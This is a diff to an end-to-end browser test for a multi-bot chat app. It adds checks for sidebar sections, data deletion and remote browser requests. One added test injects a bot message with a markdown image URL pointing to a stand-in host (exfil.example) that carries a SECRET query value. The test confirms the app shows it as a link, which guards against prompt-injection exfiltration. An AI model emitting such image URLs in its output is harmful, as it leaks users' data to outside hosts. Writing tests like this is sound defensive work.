@@ -20,7 +20,7 @@ const shots = path.resolve(process.env.E2E_SCREENSHOTS ?? path.join(root, "scree
 await mkdir(shots, { recursive: true });
 const state = await mkdtemp(path.join(tmpdir(), "bots-e2e-"));
 
-const config = loadConfig({ ...process.env, ENGINE: "demo", DEV_LOGIN: "1", STATE_DIR: state, ADMINS: "alice", WORKSPACE_DIR: path.join(root, "workspace"), ORG_NAME: "Acme" });
+const config = loadConfig({ ...process.env, ENGINE: "demo", DEV_LOGIN: "1", COMPUTER_ACCESS: "shell", STATE_DIR: state, ADMINS: "alice", WORKSPACE_DIR: path.join(root, "workspace"), ORG_NAME: "Acme" });
 const app = await buildApp(config, { engine: new DemoEngine(8) });
 await new Promise<void>((r) => app.server.listen(0, "127.0.0.1", r));
 const base = `http://127.0.0.1:${(app.server.address() as AddressInfo).port}`;
@@ -29,6 +29,10 @@ const browser = await chromium.launch({ executablePath: process.env.CHROMIUM_PAT
 const context = await browser.newContext({ viewport: { width: 1440, height: 900 }, colorScheme: "dark" });
 const page = await context.newPage();
 const errors: string[] = [];
+const remoteRequests: string[] = [];
+context.on("request", (r) => {
+    if (!r.url().startsWith(base) && !r.url().startsWith("data:") && !r.url().startsWith("blob:")) remoteRequests.push(r.url());
+});
 page.on("console", (m) => m.type() === "error" && errors.push(`console: ${m.text()}`));
 page.on("pageerror", (e) => errors.push(`pageerror: ${e.message}`));
 
@@ -109,7 +113,22 @@ try {
     await page.getByRole("button", { name: "Bot profile" }).click();
     await page.waitForSelector(".profile .hero");
     await shot("profile-panel");
+    // Sidebar organization: file the lead bot under a section
+    const sectionInput = page.locator(".profile input[list=section-names]");
+    await sectionInput.fill("Leadership");
+    await sectionInput.press("Enter");
+    await sectionInput.blur();
+    await page.waitForSelector(".sidebar .section-head:has-text('Leadership')");
     await page.getByRole("button", { name: "Close profile" }).click();
+    await shot("sidebar-sections");
+
+    // Bot output can't make the browser load remote images (prompt-injection exfiltration)
+    const groupId = new URL(page.url()).hash.split("/")[2]!;
+    const repo = app.runtime.repo;
+    const exfil = repo.addMessage(groupId, "bot", repo.threads("alice", { kind: ["group"] })[0]!.botIds[0]!, "Report ready ![chart](https://exfil.example/c.png?d=SECRET)");
+    app.runtime.hub.publish("alice", { type: "message.created", message: exfil });
+    await page.waitForSelector(`[data-id="${exfil.id}"] a[href^="https://exfil.example"]`);
+    if (await page.locator(`[data-id="${exfil.id}"] img`).count()) errors.push("remote image rendered as <img>");
 
     // Teach a skill from the thread
     await page.locator(".roster-item", { hasText: "Atlas" }).click();
@@ -155,6 +174,15 @@ try {
 
     const overflow = await page.evaluate(() => document.documentElement.scrollWidth > window.innerWidth + 1);
     if (overflow) errors.push("horizontal overflow at 390px");
+
+    // Delete my data, last: it signs the user out
+    await page.setViewportSize({ width: 1440, height: 900 });
+    await page.goto(`${base}/#/settings`);
+    await page.getByRole("button", { name: "Delete all my data" }).click();
+    await page.getByRole("button", { name: "Delete everything" }).click();
+    await page.waitForSelector(".login");
+    if (app.runtime.repo.threads("alice", { includeArchived: true }).length) errors.push("threads survived delete-my-data");
+    if (remoteRequests.length) errors.push(`browser made remote requests: ${remoteRequests.join(", ")}`);
 } catch (err) {
     errors.push(`flow: ${(err as Error).stack ?? err}`);
     await page.screenshot({ path: path.join(shots, "failure.png") }).catch(() => {});
